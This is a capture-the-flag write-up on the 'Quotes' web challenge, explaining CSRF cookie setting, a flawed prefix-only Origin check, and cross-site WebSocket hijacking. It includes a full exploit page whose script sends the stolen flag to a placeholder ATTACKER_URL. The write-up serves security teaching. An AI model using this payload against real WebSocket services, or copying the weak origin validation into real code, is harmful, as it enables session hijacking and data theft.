<h2>Quotes</h2>

<blockquote>
  <p>Feeling lost? Why don't you come and get quotes from the wise?</p>
  
  <p>MD5 (quotes.tar.gz) = 3ba36e72cb0ee2186745673475de8cf7</p>
  
  <ul>
  <li>复读机</li>
  </ul>
</blockquote>

<p>This was a simple client-side web exploitation challenge. From the <code>/share</code> endpoint we can submit a URL for the admin bot to visit.</p>

<p>```python
@app.route('/share', methods=['GET','POST'])
def share():
    if request.method == "GET":
        return render<em>template("share.html")
    else:
        if not request.form.get('url'):
            return "yes?"
        else:
            thread</em>a = Bot(request.form.get('url'))
            thread_a.start()
            return "nice quote, thanks for sharing!"</p>

<p>```</p>

<p>Let's take a look at the actual functionality of the web app! The flag can be found in the <code>/quote</code> WebSockets endpoint - as long as we satisfy the following conditions:</p>

<ul>
<li>The WebSocket client's origin must start with <code>http://localhost</code></li>
<li>The client must have the correct <code>auth</code> cookie</li>
</ul>

<p>```python
@sockets.route('/quote')
def echo_socket(ws):
    print('/quote', flush=True)
    while not ws.closed:
        try:
            try:
                cookie = dict(i.split('=') for i in ws.handler.headers.get('Cookie').split('; '))
            except:
                cookie = {}</p>

<pre><code>        # only admin from localhost can get the GreyCat's quote
        if ws.origin.startswith("http://localhost") and cookie.get('auth') == auth_token:
            ws.send(f"{os.environ['flag']}")
        else:
            ws.send(f"{quotes[random.randint(0,len(quotes))]}")
        ws.close()
    except Exception as e:
        print('error:',e, flush=True)
</code></pre>

<p>```</p>

<h3>Setting the Auth Cookie</h3>

<p>The correct <code>auth</code> cookie is set at the <code>/auth</code> endpoint when the request is made locally by the admin bot.</p>

<p>```python</p>

<h1>authenticate localhost only</h1>

<p>@app.route('/auth')
def auth():
    if request.remote<em>addr == "127.0.0.1":
        resp = make</em>response("authenticated")
        # I heard httponly defend against XSS(what is that?)
        resp.set<em>cookie("auth", auth</em>token, httponly=True)
    else:
        resp = make_response("unauthenticated")
    return resp</p>

<p>```</p>

<p>It is trivial to perform a GET-based CSRF through a top-level navigation to set the authentication cookie for the victim. We subsequently "sleep" for 1 second before continuing with the rest of the exploit to ensure that the nagivation was completed and the cookie was set.</p>

<p>```javascript
const sleep = async (ms) =&gt; {
    return new Promise(resolve =&gt; setTimeout(resolve, ms));
}</p>

<p>window.open("http://localhost:7070/auth");</p>

<p>await sleep(1000);
```</p>

<h3>Bypassing the Origin Check</h3>

<p>Although the WebSockets library used (<a href="https://github.com/heroku-python/flask-sockets">flask_sockets</a>) is pretty old, there is no vulnerability in the <code>ws.origin</code> provided - afterall, <code>gevent</code> is the one providing the necessary information in the WSGI environment.</p>

<p>The <code>ws.origin</code> value corresponds to that of the <code>Origin</code> request header, which is one of the <a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name">forbidden header names </a>that cannot be modified progammatically by JavaScript. <em>_ This is a special request header that comprises of only the following three parts of the _current</em> webpage URL:</p>

<p><code>
&lt;scheme&gt;://&lt;hostname&gt;:&lt;port&gt;
</code></p>

<p>Unless we find a browser zero-day that allows a malicious webpage to spoof <code>Origin</code> headers (this would be quite interesting), there is no way around our exploit page's origin needing to start with <code>http://localhost</code>.</p>

<p>But is that sufficient validation to ensure the WebSocket connection came from a page hosted on the localhost? Nope! We could simply use a domain <em>starting with</em> <code>localhost</code>, e.g. <code>localhost.zeyu2001.com</code>.</p>

<h3>Final Payload</h3>

<p>Because there is no CSRF token being checked and because WebSockets are not restricted by the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-Origin Policy</a>, we could use "cross-site WebSocket hijacking" to obtain and exfiltrate the flag.</p>

<p>The following page needs to be hosted on a domain starting with <code>localhost</code> and submitted to <code>/share</code>.</p>

<p>```markup
<html>
    <body>
        <script>
            (async () =&gt; {</p>

<pre><code>            const sleep = async (ms) =&gt; {
                return new Promise(resolve =&gt; setTimeout(resolve, ms));
            }

            window.open("http://localhost:7070/auth");

            await sleep(1000);

            const ws = new WebSocket('ws://localhost:7070/quote');

            ws.onopen = function open() {
                ws.send('getquote');
            };

            ws.onmessage = function incoming(data) {
                fetch("http://ATTACKER_URL/?quote=" + data.data)
            };
        })();
    &lt;/script&gt;
&lt;/body&gt;
</code></pre>

<p></html>
```</p>
